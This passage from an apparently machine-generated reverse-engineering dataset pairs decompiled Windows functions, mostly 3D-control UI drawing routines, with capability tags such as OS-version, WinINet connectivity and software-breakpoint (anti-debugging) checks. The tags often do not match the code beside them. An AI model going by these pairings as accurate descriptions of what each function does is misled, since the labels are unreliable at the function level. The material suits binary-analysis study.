}\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar4);\n    pcVar3 = _sym.imp.KERNEL32.dll_GlobalAddAtomA;\n    if (*0x44f3e0 != 0) {\n        *0x44f3e8 = (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(0x44b6ac);\n        if ((*0x44f3e8 != 0) && (*0x44f3ee = (*pcVar3)(\"C3dNew\"),  *0x44f3ee != 0)) {\n            *0x44f3ec = (*pcVar3)(\"C3dL\");\n            *0x44f3ea = (*pcVar3)(\"C3dH\");\n            if ((*0x44f3ec == 0) || (*0x44f3ea == 0)) {\n                *0x44f3e0 = 0;\n                return 0;\n            }\n            *0x44f3f2 = (*pcVar3)(\"C3dLNew\");\n            *0x44f3f0 = (*pcVar3)(\"C3dHNew\");\n            if ((*0x44f3f2 == 0) || (*0x44f3f0 == 0)) {\n                *0x44f3e0 = 0;\n                return 0;\n            }\n            *0x44f3f4 = (*pcVar3)(\"C3dD\");\n            if (*0x44f3f4 != 0) {\n                *0x44fee5 = (*pcVar2)(0x2a);\n                fcn.004178a0();\n                iVar5 = fcn.00417c10(1);\n                pcVar2 = _sym.imp.USER32.dll_GetClassInfoA;\n                if (iVar5 != 0) {\n                    puVar8 = 0x42cb74;\n                    puVar7 = 0x44fe40;\n                    do {\n                        puVar1 = puVar8 + -5;\n                        *puVar7 = *puVar8;\n                        puVar8 = puVar8 + 8;\n                        (*pcVar2)(0, puVar1, &stack0xffffffb4);\n                        puVar7[1] = uStack72;\n                        puVar7 = puVar7 + 6;\n                    } while (puVar8 < vtable.exception.0);\n                    iVar5 = (*pcVar2)(0, 0x8002, &stack0xffffffb4);\n                    if (iVar5 == 0) {\n                        *0x44fed0 = _sym.imp.USER32.dll_DefDlgProcA;\n                    }\n                    else {\n                        *0x44fed0 = uStack72;\n                    }\n                    goto code_r0x004179db;\n                }\n            }\n        }\n        *0x44f3e0 = 0;\n    }\ncode_r0x004179db:\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x44f3c0);\n    return *0x44f3e0;\n}\n",
        "token_count": 1028
    },
    "00417b30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00417b30(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    ushort uVar4;\n    ushort extraout_var;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x44f3c0);\n    piVar2 = 0x44fe40;\n    do {\n        if (*piVar2 != 0) {\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 6;\n    } while (piVar2 < 0x44fed0);\n    uVar3 = fcn.00416b70();\n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalDeleteAtom;\n    if (*0x44f3e8 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar3 & 0xffff0000 | *0x44f3e8);\n    }\n    if (*0x44f3ee != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x44f3ee);\n    }\n    if (*0x44f3ec != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x44f3ec);\n    }\n    if (*0x44f3ea != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x44f3ea);\n    }\n    if (*0x44f3f2 != 0) {\n        uVar3 = (*pcVar1)(uVar3 & 0xffff0000 | *0x44f3f2);\n    }\n    uVar4 = uVar3 >> 0x10;\n    if (*0x44f3f0 != 0) {\n        (*pcVar1)(uVar3 & 0xffff0000 | *0x44f3f0);\n        uVar4 = extraout_var;\n    }\n    if (*0x44f3f4 != 0) {\n        (*pcVar1)(CONCAT22(uVar4, *0x44f3f4));\n    }\n    *0x44f3e0 = 0;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x44f3c0);\n    return;\n}\n",
        "token_count": 535
    },
    "004184a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool fcn.004184a0(uint param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint16_t *puVar5;\n    uint32_t unaff_EDI;\n    uchar auStack16 [8];\n    uint16_t uStack8;\n    uint32_t uStack4;\n    \n    iVar2 = fcn.004168a0(param_1);\n    if (iVar2 != 0) {\n        return false;\n    }\n    iVar2 = 0;\n    puVar5 = 0x42cb7c;\n    (*_sym.imp.USER32.dll_GetClassNameA)(param_1, auStack16, 0x10);\n    uVar1 = uStack4 & 0xffff;\n    do {\n        if ((*puVar5 & uVar1) != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(puVar5 + -0xe, &stack0xffffffe4);\n            if (iVar3 == 0) {\n                uVar4 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffff0);\n                iVar3 = (**(iVar2 * 0x20 + 0x42cb78))\n                                  (param_1, uVar4, unaff_EDI & 0xffff0000 | uVar1, puVar5 & 0xffff0000 | uStack8, \n                                   uStack4);\n                if (iVar3 == 1) {\n                    if ((uStack8 == 1) && (*0x44f402 == 0x10)) {\n                        fcn.00416ab0(param_1, *(iVar2 * 0x18 + 0x44fe40));\n                        return true;\n                    }\n                    fcn.00416910(param_1, *(iVar2 * 0x18 + 0x44fe40));\n                }\n                return iVar3 != 0;\n            }\n        }\n        puVar5 = puVar5 + 0x10;\n        iVar2 = iVar2 + 1;\n        if (0x42cc3b < puVar5) {\n            return false;\n        }\n    } while( true );\n}\n",
        "token_count": 489
    },
    "004186c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004186c0(uint param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    int32_t iStack260;\n    uchar *puStack256;\n    uchar *puStack252;\n    uchar *puStack248;\n    int32_t iStack244;\n    int32_t iStack240;\n    int32_t iStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    int32_t iStack224;\n    uchar *puStack220;\n    int32_t iStack216;\n    int32_t iStack212;\n    int32_t iStack208;\n    int32_t iStack204;\n    int32_t iStack200;\n    int32_t iStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    int32_t iStack172;\n    int32_t iStack168;\n    uint uStack164;\n    int32_t iStack160;\n    int32_t iStack156;\n    int32_t iStack152;\n    int32_t iStack148;\n    int32_t iStack144;\n    uint uStack140;\n    int32_t iStack136;\n    int32_t iStack132;\n    int32_t iStack128;\n    uint uStack124;\n    int32_t iStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    int32_t iStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar auStack28 [12];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack16 = *param_3;\n    uStack12 = param_3[1];\n    uStack8 = param_3[2];\n    uStack48 = 0xf;\n    uStack52 = 7;\n    uStack4 = param_3[3];\n    puStack56 = 0x7;\n    puStack60 = param_3;\n    iStack64 = param_2;\n    puStack68 = 0x4186f6;\n    fcn.00416bd0();\n    puStack56 = &stack0xfffffff0;\n    uStack48 = 0xffffffff;\n    uStack52 = 0xffffffff;\n    puStack60 = 0x418708;\n    (*_sym.imp.USER32.dll_InflateRect)();\n    if (param_3 == 1) {\n        puStack60 = uStack8;\n        iStack64 = 0x41871b;\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n        if (iVar1 != 0) {\n            puStack72 = &stack0xffffffe4;\n            puStack60 = 0xf;\n            iStack64 = 7;\n            puStack68 = 0x7;\n            iStack76 = param_2;\n            iStack80 = 0x418730;\n            fcn.00416bd0();\n            puStack68 = &stack0xffffffe4;\n            puStack60 = 0xffffffff;\n            iStack64 = 0xffffffff;\n            puStack72 = 0x418742;\n            (*_sym.imp.USER32.dll_InflateRect)();\n        }\n    }\n    puStack60 = 0xf00021;\n    puStack72 = param_3[1];\n    iStack64 = 1;\n    iStack76 = *param_3;\n    puStack68 = 0x1;\n    iStack80 = param_2;\n    uStack84 = 0x418759;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    uStack84 = 0xf00021;\n    uStack96 = param_3[1];\n    uStack88 = 1;\n    uStack92 = 1;\n    iStack100 = param_3[2] + -1;\n    iStack104 = param_2;\n    uStack108 = 0x418772;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    uStack108 = 0xf00021;\n    uStack112 = 1;\n    iStack120 = param_3[3] + -1;\n    uStack116 = 1;\n    uStack124 = *param_3;\n    iStack128 = param_2;\n    iStack132 = 0x41878a;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    iStack132 = 0xf00021;\n    iStack136 = 1;\n    iStack144 = param_3[3] + -1;\n    uStack140 = 1;\n    iStack148 = param_3[2] + -1;\n    iStack152 = param_2;\n    iStack156 = 0x4187a4;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    bVar4 = iStack80 == 0;\n    iVar1 = bVar4 + 1;\n    iStack156 = *0x44f424;\n    if (iStack80 != 0) {\n        iStack156 = *0x44f42c;\n    }\n    iStack160 = param_2;\n    uStack164 = 0x4187c9;\n    iStack144 = (*_sym.imp.GDI32.dll_SelectObject)();\n    uStack164 = 0xf00021;\n    iStack168 = iStack120 - iStack128;\n    iStack176 = iStack128;\n    iStack180 = iStack132;\n    iStack184 = param_2;\n    iStack188 = 0x4187ed;\n    iStack172 = iVar1;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    iStack188 = 0xf00021;\n    iStack196 = iStack148 - iStack156;\n    iStack200 = iStack152;\n    iStack204 = iStack156;\n    iStack208 = param_2;\n    iStack212 = 0x41880d;\n    iStack192 = iVar1;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    if (iStack136 == 0) {\n        iVar3 = 0;\n        iStack212 = *0x44f42c;\n        iStack216 = param_2;\n        puStack220 = 0x418823;\n        (*_sym.imp.GDI32.dll_SelectObject)();\n        iStack168 = iStack168 + -1;\n        iStack172 = iStack172 + -1;\n        if (iVar1 != 0) {\n            do {\n                iStack212 = 0xf00021;\n                iStack216 = 1;\n                puStack220 = (iStack172 - iStack180) + 1;\n                iStack224 = iStack168;\n                iStack228 = iStack180;\n                iStack232 = param_2;\n                iStack236 = 0x418851;\n                (*_sym.imp.GDI32.dll_PatBlt)();\n                iStack236 = 0xf00021;\n                iStack240 = iStack192 - iStack200;\n                iStack244 = 1;\n                puStack248 = iStack200;\n                puStack252 = iStack196;\n                puStack256 = param_2;\n                iStack260 = 0x418872;\n                (*_sym.imp.GDI32.dll_PatBlt)();\n                if (iVar3 < bVar4) {\n                    puStack220 = &stack0xffffff4c;\n                    iStack212 = 0xffffffff;\n                    iStack216 = 0xffffffff;\n                    iStack224 = 0x418888;\n                    (*_sym.imp.USER32.dll_InflateRect)();\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < iVar1);\n        }\n    }\n    iStack180 = iStack180 + 1;\n    iStack176 = iStack176 + 1;\n    iStack212 = *0x44f428;\n    iStack216 = param_2;\n    puStack220 = 0x4188a2;\n    (*_sym.imp.GDI32.dll_SelectObject)();\n    puStack220 = 0xf00021;\n    iStack224 = iStack176 - iStack184;\n    iStack228 = iStack180 - iStack188;\n    iStack232 = iStack184;\n    iStack236 = iStack188;\n    iStack240 = param_2;\n    iStack244 = 0x4188ca;\n    (*_sym.imp.GDI32.dll_PatBlt)();\n    iStack244 = iStack192;\n    puStack248 = 0x4188d5;\n    iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)();\n    if (iVar1 == 0) {\n        puStack248 = *0x44f41c;\n        puStack252 = param_2;\n        puStack256 = 0x4188e6;\n        (*_sym.imp.GDI32.dll_SetTextColor)();\n    }\n    iVar1 = iStack184;\n    puStack248 = &stack0xffffff24;\n    puStack252 = &stack0xffffff20;\n    puStack256 = iStack184;\n    iStack260 = param_2;\n    fcn.00416dc0();\n    iStack212 = iStack212 + ((iStack204 - iStack212) - puStack220) / 2;\n    iStack216 = iStack216 + ((iStack208 - iStack216) - iStack224) / 2;\n    iVar3 = iStack212 + puStack220;\n    if (iStack204 <= iStack212 + puStack220) {\n        iVar3 = iStack204;\n    }\n    iVar2 = iStack216 + iStack224;\n    if (iStack208 <= iStack216 + iStack224) {\n        iVar2 = iStack208;\n    }\n    iStack208 = iVar2;\n    if (iStack172 != 0) {\n        puStack256 = &stack0xffffff28;\n        puStack248 = 0x1;\n        puStack252 = 0x1;\n        iStack260 = 0x41896e;\n        iStack204 = iVar3;\n        (*_sym.imp.USER32.dll_OffsetRect)();\n        iVar3 = param_3[2] + -3;\n        if (iStack208 <= param_3[2] + -3) {\n            iVar3 = iStack208;\n        }\n        iStack208 = iVar3;\n        iVar3 = param_3[3] + -3;\n        if (iStack204 <= param_3[3] + -3) {\n            iVar3 = iStack204;\n        }\n    }\n    iStack204 = iVar3;\n    puStack252 = &stack0xffffff28;\n    puStack248 = 0x20;\n    puStack256 = iStack180;\n    iStack260 = iVar1;\n    (*_sym.imp.USER32.dll_DrawTextA)(param_2);\n    iVar1 = (*_sym.imp.USER32.dll_GetFocus)();\n    if (iVar1 == iStack216) {\n        (*_sym.imp.USER32.dll_InflateRect)(&stack0xffffff14, 1, 1);\n        (*_sym.imp.USER32.dll_IntersectRect)(&stack0xffffff08, &stack0xffffff08, param_3);\n        (*_sym.imp.USER32.dll_DrawFocusRect)(param_2, &stack0xfffffefc);\n    }\n    if (puStack248 != NULL) {\n        (*_sym.imp.GDI32.dll_SelectObject)(param_2, puStack248);\n    }\n    return;\n}\n",
        "token_count": 2634
    },
    "00418a00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00418a00(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack460;\n    int32_t iStack456;\n    int32_t iStack452;\n    int32_t iStack448;\n    int32_t iStack444;\n    uint32_t uStack440;\n    int32_t iStack436;\n    int32_t iStack432;\n    int32_t iStack428;\n    int32_t iStack424;\n    int32_t iStack420;\n    int32_t iStack416;\n    int32_t iStack412;\n    int32_t iStack408;\n    uint32_t uStack404;\n    int32_t iStack400;\n    int32_t iStack396;\n    int32_t iStack392;\n    int32_t iStack388;\n    int32_t iStack384;\n    uchar *puStack380;\n    int32_t iStack376;\n    uint uStack372;\n    int32_t iStack368;\n    int32_t iStack364;\n    uint uStack360;\n    uchar auStack308 [208];\n    uint32_t uStack100;\n    int32_t iStack4;\n    \n    uStack360 = 0xfffffff0;\n    iStack364 = param_1;\n    iStack368 = 0x418a1a;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    iStack368 = param_1;\n    uVar2 = uVar2 & 0x1f;\n    uStack372 = 0x418a2f;\n    (*_sym.imp.USER32.dll_GetParent)();\n    uStack372 = 2;\n    iStack376 = iStack4;\n    puStack380 = 0x418a43;\n    (*_sym.imp.GDI32.dll_SetBkMode)();\n    puStack380 = &stack0xfffffecc;\n    iStack384 = param_1;\n    iStack388 = 0x418a51;\n    (*_sym.imp.USER32.dll_GetClientRect)();\n    iStack388 = 0;\n    iStack392 = 0;\n    iStack396 = 0x31;\n    iStack400 = param_1;\n    uStack404 = 0x418a7d;\n    uStack404 = (*_sym.imp.USER32.dll_SendMessageA)();\n    iStack384 = uStack404;\n    if (uStack404 != 0) {\n        iStack408 = iStack4;\n        iStack412 = 0x418a8d;\n        iStack384 = (*_sym.imp.GDI32.dll_SelectObject)();\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetSysColor;\n    uStack404 = 0xf;\n    iStack408 = 0x418a9b;\n    iStack408 = (*_sym.imp.USER32.dll_GetSysColor)();\n    iStack412 = iStack4;\n    iStack416 = 0x418aa3;\n    (*_sym.imp.GDI32.dll_SetBkColor)();\n    iStack416 = 0x12;\n    iStack420 = 0x418aa7;\n    iStack420 = (*pcVar1)();\n    iStack424 = iStack4;\n    iStack428 = 0x418aaf;\n    (*_sym.imp.GDI32.dll_SetTextColor)();\n    iStack428 = param_1;\n    iStack432 = iStack4;\n    iStack436 = 0x135;\n    uStack440 = iStack396;\n    iStack444 = 0x418ac1;\n    iStack444 = (*_sym.imp.USER32.dll_SendMessageA)();\n    iStack448 = iStack4;\n    iStack452 = 0x418ac9;\n    uStack404 = (*_sym.imp.GDI32.dll_SelectObject)();\n    iStack452 = iStack384;\n    iStack456 = iStack388;\n    iStack460 = iStack392;\n    (*_sym.imp.GDI32.dll_IntersectClipRect)(iStack4, iStack396);\n    if (((uStack100 & 0x10) != 0) && (uVar2 != 7)) {\n        (*_sym.imp.GDI32.dll_PatBlt)\n                  (iStack4, iStack416, iStack412, iStack408 - iStack416, uStack404 - iStack412, 0xf00021);\n    }\n    iVar10 = param_1;\n    iStack432 = (*_sym.imp.USER32.dll_IsWindowEnabled)(param_1);\n    uVar9 = 0;\n    iVar8 = 0;\n    uVar7 = 0xf2;\n    uStack404 = (*_sym.imp.USER32.dll_SendMessageA)(param_1, 0xf2, 0, 0);\n    iVar11 = 0;\n    uStack440 = uStack404 & 3;\n    uStack404 = uStack404 & 4;\n    if ((((uStack100 & 10) != 0) || (uVar2 == 0)) || (uVar2 == 1)) {\n        iStack452 = (*_sym.imp.USER32.dll_GetWindowTextA)(param_1, &stack0xfffffe7c, 0x100);\n    }\n    // switch table (10 cases) at 0x418f24\n    switch(uVar2) {\n    case 0:\n    case 1:\n        fcn.004186c0(param_1, iStack4, &stack0xfffffe5c, &stack0xfffffe7c, iStack452, uVar2, uStack404);\n        goto code_r0x00418ef9;\n    case 2:\n    case 3:\n        break;\n    case 4:\n    case 9:\n        iVar11 = 0xd;\n        break;\n    case 5:\n    case 6:\n        if (uStack440 == 2) {\n            iVar11 = 0x1a;\n        }\n        break;\n    case 7:\n        if ((uStack100 & 6) != 0) {\n            fcn.00416dc0(iStack4, &stack0xfffffe7c, &stack0xfffffe48, &stack0xfffffe38);\n            if (iStack456 == 0) {\n                fcn.00416dc0(iStack4, 0x44b6c0, &stack0xfffffe6c, &stack0xfffffe38);\n            }\n            pcVar1 = _sym.imp.USER32.dll_ClientToScreen;\n            iStack436 = iStack436 + 4;\n            iStack428 = uStack440 + iStack436 + 4;\n            iStack424 = iStack456 + iStack432;\n            if ((uStack100 & 0x20) != 0) {\n                puVar6 = &stack0xfffffe6c;\n                iStack400 = iStack432;\n                iStack396 = iStack412;\n                uStack404 = iStack436;\n                iStack392 = iStack424;\n                (*_sym.imp.USER32.dll_ClientToScreen)(param_1, puVar6);\n                (*pcVar1)(param_1, &stack0xfffffe6c);\n                pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n                (*_sym.imp.USER32.dll_ScreenToClient)(uVar9, &stack0xfffffe5c);\n                (*pcVar1)(uVar7, &stack0xfffffe5c);\n                (*_sym.imp.USER32.dll_InvalidateRect)(puVar6, &stack0xfffffe4c, 1);\n                return;\n            }\n            iStack412 = iStack412 + -1;\n            iStack408 = iStack408 + -1;\n            iStack416 = iStack416 + iStack456 / 2;\n            fcn.00416bd0(iStack4, &stack0xfffffe5c, 2, 2, 0xf);\n            (*_sym.imp.USER32.dll_OffsetRect)(&stack0xfffffe5c, 1, 1);\n            fcn.00416bd0(iStack4, &stack0xfffffe50, 0, 0, 0xf);\n            if (iStack460 == 0) {\n                (*_sym.imp.GDI32.dll_SetTextColor)(iStack4, *0x44f41c);\n            }\n            (*_sym.imp.USER32.dll_DrawTextA)(iStack4, &stack0xfffffe70, iVar11, &stack0xfffffe40, 0x20);\n        }\n    default:\n        goto code_r0x00418ef9;\n    }\n    if (((uStack100 & 4) != 0) && (iVar3 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(iStack4),  iVar3 != 0)) {\n        iVar4 = (*_sym.imp.GDI32.dll_SelectObject)(iVar3, *0x44f430);\n        if (iVar4 != 0) {\n            iVar5 = iStack444;\n            if (iVar11 != 0) {\n                iVar5 = iStack436 + -0xe;\n            }\n            (*_sym.imp.GDI32.dll_BitBlt)\n                      (iStack4, iVar5, uStack440 + ((iStack432 - uStack440) + -0xd) / 2, 0xe, 0xd, iVar3, uVar9, iVar10\n                       , 0xcc0020);\n            (*_sym.imp.GDI32.dll_SelectObject)(iVar3, iVar4);\n        }\n        (*_sym.imp.GDI32.dll_DeleteDC)(iVar3);\n    }\n    if ((uStack100 & 2) != 0) {\n        if (iStack456 == 0) {\n            iStack436 = iStack420 + 0x12;\n        }\n        else {\n            iStack428 = iStack412 + -0x12;\n        }\n        if (iStack448 == 0) {\n            (*_sym.imp.GDI32.dll_SetTextColor)(iStack4, *0x44f41c);\n        }\n        (*_sym.imp.USER32.dll_DrawTextA)(iStack4, &stack0xfffffe7c, iStack452, &stack0xfffffe4c, 0x24);\n    }\n    if ((uStack100 & 8) != 0) {\n        fcn.00416dc0(iStack4, &stack0xfffffe7c, &stack0xfffffe6c, &stack0xfffffe48);\n        iStack432 = ((iStack424 - iStack432) - uStack440) / 2;\n        iStack424 = uStack440 + iStack432;\n        if (iStack456 == 0) {\n            iStack436 = iStack420 + 0x12;\n        }\n        else {\n            iStack412 = iStack412 + -0x12;\n            iStack436 = iStack420;\n        }\n        iStack428 = uStack404 + iStack436;\n        (*_sym.imp.USER32.dll_InflateRect)(&stack0xfffffe4c, 1, 1);\n        (*_sym.imp.USER32.dll_IntersectRect)(&stack0xfffffe40, &stack0xfffffe40, &stack0xfffffe50);\n        (*_sym.imp.USER32.dll_DrawFocusRect)(iStack4, &stack0xfffffe34);\n    }\ncode_r0x00418ef9:\n    (*_sym.imp.GDI32.dll_SelectObject)(iStack4, iStack444);\n    if (iVar8 != 0) {\n        (*_sym.imp.GDI32.dll_SelectObject)(iStack4, iVar8);\n    }\n    return;\n}\n",
        "token_count": 2585
    },
    "00419230": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00419230(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t unaff_EDI;\n    int32_t unaff_retaddr;\n    uint uVar8;\n    int32_t iStack124;\n    int32_t iStack120;\n    uchar *puStack116;\n    int32_t iStack112;\n    uchar *puStack108;\n    int32_t iStack104;\n    int32_t iStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uchar auStack68 [4];\n    uint32_t uStack64;\n    uchar auStack56 [8];\n    int32_t iStack48;\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    iStack88 = -0x10;\n    uStack92 = param_1;\n    puStack96 = 0x419244;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    if ((uVar2 & 0x10000000) != 0) {\n        if ((param_1 == 3) && ((uVar2 & 3) == 3)) {\n            puStack96 = NULL;\n            iStack100 = 0;\n            iStack104 = 0x157;\n            puStack108 = param_1;\n            iStack112 = 0x419270;\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)();\n            if (iVar3 != 0) {\n                return;\n            }\n        }\n        if (unaff_retaddr != 0) {\n            puStack96 = param_1;\n            iStack100 = 0x419286;\n            (*_sym.imp.USER32.dll_HideCaret)();\n        }\n        puStack96 = &stack0xffffffc8;\n        iStack100 = param_1;\n        iStack104 = 0x419292;\n        (*_sym.imp.USER32.dll_GetWindowRect)();\n        iStack104 = param_1;\n        puStack108 = 0x419299;\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)();\n        pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n        puStack108 = &stack0xffffffbc;\n        puStack116 = 0x4192a9;\n        iStack112 = iVar3;\n        (*_sym.imp.USER32.dll_ScreenToClient)();\n        puStack116 = &stack0xffffffbc;\n        uVar2 = 0xf;\n        iStack124 = 0x4192b5;\n        iStack120 = iVar3;\n        (*pcVar1)();\n        iStack124 = iVar3;\n        uVar4 = (*_sym.imp.USER32.dll_GetDC)();\n        puStack96 = puStack108 & 0x100000;\n        if (puStack96 != NULL) {\n            uVar2 = 7;\n        }\n        uStack92 = puStack108 & 0x200000;\n        if (uStack92 != 0) {\n            uVar2 = uVar2 & 0xfffffffb;\n        }\n        iVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffff4);\n        if (iStack40 - iVar5 == -1000) {\n            puStack108 = 0x29a;\n            puStack96 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x1944, 0, &stack0xffffff94);\n            if (iStack124 == 0x29a) {\n                puStack96 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x1943, 0, &stack0xffffff84);\n            }\n            (*_sym.imp.USER32.dll_GetClassNameA)(iVar3, &stack0xffffffb0, 0x10);\n            iVar5 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(&stack0xffffffa4, \"ComboBox\");\n            if ((iVar5 == 0) || ((puStack108 == 0x1 && (unaff_EDI == 0x3eb)))) {\n                puStack116 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n                uVar8 = 2;\n                (*_sym.imp.USER32.dll_MapWindowPoints)(iVar3, puStack116, &stack0xffffff9c, 2);\n                (*_sym.imp.USER32.dll_ReleaseDC)(iVar3, uVar4);\n                uVar4 = (*_sym.imp.USER32.dll_GetDC)(uVar8);\n                if (iStack40 == 0) {\n                    uVar2 = uVar2 & 0xfffffffd;\n                    uStack92 = uStack92 + 1;\n                    iVar3 = iStack112;\n                }\n                else {\n                    uVar6 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n                    if (((uVar6 & 3) == 2) || ((uVar6 & 3) == 3)) {\n                        iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(iVar3, 0x157, 0, 0);\n                        iVar3 = iStack112;\n                        if (iVar5 != 0) {\n                            (*_sym.imp.USER32.dll_ReleaseDC)(iStack112, uVar4);\n                            (*_sym.imp.USER32.dll_ShowCaret)(param_1);\n                            return;\n                        }\n                    }\n                    else {\n                        uVar2 = uVar2 & 0xfffffff7;\n                        uVar8 = (*_sym.imp.USER32.dll_GetWindow)(iVar3, 5);\n                        (*_sym.imp.USER32.dll_GetWindowRect)(uVar8, &stack0xffffffa0);\n                        iStack88 = iStack88 + (unaff_EDI - unaff_EBX);\n                        fcn.00416d10(uVar4, &stack0xffffffa0, 0x1008);\n                        iStack88 = iStack88 + (unaff_EBX - unaff_EDI);\n                        iVar3 = iStack112;\n                    }\n                }\n            }\n        }\n        fcn.00416d10(uVar4, &stack0xffffffa0, uVar2);\n        iVar5 = iStack88;\n        if ((iStack36 == 3) && ((puStack116 & 3) == 3)) {\n            iVar7 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n            puStack96 = iVar5 - iVar7;\n            fcn.00416bd0(uVar4, &stack0xffffffa0, 7, 7, 0xc);\n            fcn.00418650(param_1);\n        }\n        else {\n            if (iStack100 != 0) {\n                iStack88 = iStack88 + 1;\n                fcn.00416bd0(uVar4, &stack0xffffffa0, 0, 0, 4);\n                iVar5 = iStack88 + -1;\n                uStack64 = puStack96;\n                iStack88 = iVar5;\n                iVar7 = (*_sym.imp.USER32.dll_GetSystemMetrics)(2);\n                puStack96 = iVar5 - iVar7;\n                fcn.00416bd0(uVar4, &stack0xffffffa0, 7, 7, 8);\n                puStack96 = uStack64;\n            }\n            if (iStack104 != 0) {\n                unaff_EBP = unaff_EBP + 1;\n                fcn.00416bd0(uVar4, &stack0xffffffa0, 0, 0, 8);\n                iVar5 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x15);\n                uStack92 = (unaff_EBP + -1) - iVar5;\n                fcn.00416bd0(uVar4, &stack0xffffffa0, 7, 7, 4);\n            }\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(iVar3, uVar4);\n        if (iStack48 != 0) {\n            (*_sym.imp.USER32.dll_ShowCaret)(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1833
    },
    "004199a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
